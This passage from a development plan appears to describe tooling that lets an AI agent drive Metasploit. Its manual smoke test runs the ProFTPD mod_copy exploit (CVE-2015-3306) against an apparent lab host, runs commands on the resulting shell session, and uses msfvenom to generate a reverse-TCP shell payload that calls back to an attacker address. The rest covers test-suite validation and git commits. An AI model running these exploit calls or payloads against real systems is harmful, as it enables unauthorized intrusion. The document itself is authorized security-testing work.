searchsploit_search(query="ProFTPD 1.3.5", target="10.10.10.5")
```

Expected response: ≥1 hit, including the mod_copy entry (EDB-49908). Confirm a
KB note landed: `kb_show` includes a "searchsploit query: ProFTPD 1.3.5" note.

### 3. metasploit_search for the matching module

```
metasploit_search(query="cve:2015-3306", type="exploit", rank="great")
```

Expected response: `exploit/multi/http/proftpd_modcopy_exec` listed.

### 4. Try the exploit (check-then-exploit)

```
metasploit_run(
  module="exploit/multi/http/proftpd_modcopy_exec",
  options={"RHOSTS": "10.10.10.5", "RPORT": 80, "SITEPATH": "/var/www/tryingharder"},
  target="10.10.10.5",
)
```

Expected response:
- `check_result: vulnerable`
- `exploit_ran: true`
- `session_id: <int>`
- `finding: recorded as severity=high`

If `check_result` says `safe` or `unknown`, this is the intended behavior — do
NOT use `force=true` reflexively. The 10.13.38.23 report is the cautionary tale.

### 5. Interact with the session

```
metasploit_session(action="list")
metasploit_session(action="cmd", session_id=<id>, command="whoami")
metasploit_session(action="cmd", session_id=<id>, command="hostname")
metasploit_session(action="cmd", session_id=<id>, command="uname -a")
```

Each command should return real output. Confirm `kb_show` now lists the
high-severity finding from step 4.

### 6. Status check

```
metasploit_status()
```

Expected: `daemon: running`, version populated, active_workspace: 10.10.10.5,
session count ≥ 1.

### 7. Close + stop

```
metasploit_session(action="close", session_id=<id>)
metasploit_stop()
```

`metasploit_stop` should report `status: stopped`, `sessions_lost: 0` (because we
closed manually first). If sessions had been left open, the response would
include a `warning: N open session(s) killed`.

### 8. (Bonus) Generate a payload

```
msfvenom_generate(
  payload="linux/x64/shell_reverse_tcp",
  lhost="10.10.14.5", lport=4444, format="elf",
  target="10.10.10.5",
)
```

Expected: a binary appears in `targets/10.10.10.5/loot/payloads/`, named
`linux_x64_shell_reverse_tcp-<sha8>.elf`. `kb_show` lists it as an
ArtifactFact with kind=payload.

---

## Pass criteria

- Each of the 8 tools returns the expected shape
- At least one session opens and persists across `cmd` calls
- One severity=high FindingFact is written
- One ArtifactFact (payload) is written
- `metasploit_stop` cleans up the pidfile

## Fail-safe

If anything looks wrong, the daemon is shared and lives at PID stored in
`targets/.shared/msfrpc/pidfile`. Manually kill with:
```
kill -TERM $(cat targets/.shared/msfrpc/pidfile)
rm targets/.shared/msfrpc/pidfile
```
Then re-run `metasploit_start`.
```

- [ ] **Step 2: Verify**

Run:
```
ls tests/manual/exploit_smoke.md
```
Expected: file exists.

- [ ] **Step 3: (No automated tests — manual doc only)**

- [ ] **Step 4: (Skip)**

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add tests/manual/exploit_smoke.md
git -C .worktrees/metasploit-bridge commit -m "docs(smoke): manual end-to-end test for metasploit bridge"
```

---

## Task 22: Final validation — full test suite + integration smoke

**Files:**
- None (validation-only)

Run the entire test suite. Confirm baseline + new tests pass. Confirm `ALL_TOOLS == 77` and the profile registry has 15 entries. Document any flakes for follow-up.

- [ ] **Step 1: Run the full test suite**

Run:
```
.devenv/state/venv/bin/pytest -v 2>&1 | tail -50
```

Expected:
- Pass count: ~490 (baseline 438 + ~52 new tests across 5 new test files +
  registry assertions). Adjust if a few tests collapse to fewer or expand.
- Zero failures.

- [ ] **Step 2: Confirm tool registry assertions**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```

Expected: All assertions pass, including the count.

- [ ] **Step 3: Confirm profile count**

Run:
```
.devenv/state/venv/bin/python -c "from reverser.profiles import list_profiles; print(len(list_profiles())); print([p.key for p in list_profiles()])"
```

Expected: `15` and a list including `exploit`.

- [ ] **Step 4: Confirm `--list-profiles` includes exploit**

Run:
```
.devenv/state/venv/bin/python -m reverser interactive --list-profiles 2>&1 | grep -i exploit
```

Expected: 1+ match.

- [ ] **Step 5: Final commit (if any leftover changes)**

If steps 1-4 surfaced any tweaks needed (e.g. a count off by one), fix them and:
```
git -C .worktrees/metasploit-bridge add .
git -C .worktrees/metasploit-bridge commit -m "fix: minor cleanup from final validation"
```

If nothing needed, skip the commit.

Note: do NOT merge to main from this task. The subagent-driven workflow finishes with `superpowers:finishing-a-development-branch` (Option 1) once the operator has reviewed.

---

## Plan complete — handoff

After Task 22 passes:

1. Optionally: spawn a code-review subagent for the diff against `main`.
2. Use `superpowers:finishing-a-development-branch` skill to merge / push / discard.

**Roadmap status update:** Once merged, CAPABILITY_ROADMAP.md already has the
✅ mark from Task 20.
